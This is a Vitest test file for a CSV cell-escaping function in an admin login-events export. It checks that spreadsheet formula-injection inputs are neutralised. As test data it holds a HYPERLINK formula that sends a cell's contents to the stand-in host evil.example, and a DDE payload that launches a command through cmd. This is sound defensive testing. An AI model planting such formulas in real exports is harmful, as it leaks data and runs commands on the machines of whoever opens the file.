import { describe, expect, it } from 'vitest'
import { csvEscapeCell } from './admin.js'

describe('csvEscapeCell (login-events export)', () => {
  it('neutralizes formulas an attacker can plant in User-Agent', () => {
    // The exact payload a failed /auth/login can store in login_events.user_agent.
    expect(csvEscapeCell('=HYPERLINK("https://evil.example/?x="&A1,"Open report")')).toBe(
      '"\'=HYPERLINK(""https://evil.example/?x=""&A1,""Open report"")"'
    )
    expect(csvEscapeCell("@SUM(1+1)*cmd|' /C calc'!A0")).toBe("'@SUM(1+1)*cmd|' /C calc'!A0")
    expect(csvEscapeCell('+1')).toBe("'+1")
    expect(csvEscapeCell('-1')).toBe("'-1")
    expect(csvEscapeCell('\tstart-with-tab')).toBe("'\tstart-with-tab")
  })

  it('leaves ordinary cells alone and still quotes per RFC-4180', () => {
    expect(csvEscapeCell('Mozilla/5.0')).toBe('Mozilla/5.0')
    expect(csvEscapeCell(null)).toBe('')
    expect(csvEscapeCell(undefined)).toBe('')
    expect(csvEscapeCell('a,b')).toBe('"a,b"')
    expect(csvEscapeCell('say "hi"')).toBe('"say ""hi"""')
    // A '=' that is not leading is inert in every spreadsheet.
    expect(csvEscapeCell('x=1')).toBe('x=1')
  })
})
